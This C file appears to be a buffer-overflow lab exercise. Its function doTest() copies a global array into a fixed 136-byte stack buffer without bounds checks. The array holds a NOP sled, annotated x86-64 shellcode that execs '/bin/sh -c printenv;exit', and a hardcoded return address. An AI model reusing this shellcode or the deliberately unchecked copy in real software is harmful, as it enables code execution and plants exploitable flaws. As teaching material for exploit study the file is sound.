#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

//+
// Function: main
//
// Purpose: Entry point of the program. Sets an environment variable and calls doTest function.
// It exits after doTest completes its execution.
//
// Parameters: argc (int) - Count of command-line arguments.
//             argv (char*[]) - Array of command-line arguments.
//
// Returns: None. Calls exit(0) to end the program.
//-

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

//+
// Variables: compromise, compromise1
//
// Purpose: 'compromise' contains shellcode for exploiting a buffer overflow vulnerability.
// 'compromise1' is used to probe the stack to find the correct values for the shellcode.
//
// Details: 'compromise' array includes a NOP sled, shellcode, and a return address.
// 'compromise1' is a string used to determine the buffer overflow offset.
//
//-

char compromise[159] = {
    0x90, 0x90, 0x90, 0x90,                               // noop padding (4)
    0x90, 0x90, 0x90, 0x90,                               // noop padding (4)
    0xEB, 0x4F,                                           // start:     jmp short codeEnd
    0x5E,                                                 // start2:    pop rsi
    0x48, 0x31, 0xC0,                                     // xor rax,rax
    0x88, 0x46, 0x07,                                     // mov [rsi+flagStr-exeStr-2],al
    0x88, 0x46, 0x0B,                                     // mov [rsi+cmdStr-exeStr-1],al
    0x88, 0x46, 0x19,                                     // mov [rsi+arrayAddr-exeStr-1],al
    0x48, 0x89, 0x46, 0x32,                               // mov [rsi+arrayAddr-exeStr+24],rax
    0x48, 0x89, 0x76, 0x1A,                               // mov [rsi+arrayAddr-exeStr],rsi
    0x48, 0x8D, 0x7E, 0x09,                               // lea rdi, [byte rsi+flagStr-exeStr]
    0x48, 0x89, 0x7E, 0x22,                               // mov [rsi+arrayAddr-exeStr+8],rdi
    0x48, 0x8D, 0x7E, 0x0C,                               // lea rdi, [byte rsi+cmdStr-exeStr]
    0x48, 0x89, 0x7E, 0x2A,                               // mov [rsi+arrayAddr-exeStr+16],rdi
    0x48, 0x89, 0xE2,                                     // mov rdx, rsp
    0x48, 0xC1, 0xEA, 0x20,                               // shr rdx, 32
    0x48, 0xC1, 0xE2, 0x20,                               // shl rdx, 32
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,                         // mov rcx, 0xf7fbe6FF
    0x30, 0xC9,                                           // xor cl, cl
    0x48, 0x09, 0xCA,                                     // or rdx, rcx
    0x48, 0x8B, 0x12,                                     // mov rdx, [rdx]
    0xB0, 0x3B,                                           // mov al,0x3b
    0x48, 0x89, 0xF7,                                     // mov rdi,rsi
    0x48, 0x8D, 0x76, 0x1A,                               // lea rsi,[rsi+arrayAddr-exeStr]
    0x0F, 0x05,                                           // syscall
    0xB0, 0x3C,                                           // mov al,0x3c
    0x48, 0x89, 0xC7,                                     // mov rdi,rax
    0x0F, 0x05,                                           // syscall
    0xE8, 0xAC, 0xFF, 0xFF, 0xFF,                         // codeEnd:   call start2
    0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79, // exeStr:    db "/bin/shXy"
    0x2D, 0x63, 0x58,                                     // flagStr:   db "-cX"
    0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B, // cmdStr:    db "printenv
    0x65, 0x78, 0x69, 0x74, 0x58,                         //
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // arrayAddr: dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // dq 0xffffffffffffffff

    0x10, 0xE0, 0xFF, 0xFF,
    0xFF, 0x7F, 0x00,
};


// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "MNOPWXYZ"
    "xxxxxxxx";

int i;

//+
// Function: doTest
//
// Purpose: Contains a buffer overflow vulnerability. It copies data from a global
// shellcode array (compromise) into a local buffer, potentially leading to overflow.
//
// Parameters: None. Uses global variables compromise and compromise1.
//
// Returns: None. The function may lead to undefined behavior due to buffer overflow.
//-

void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}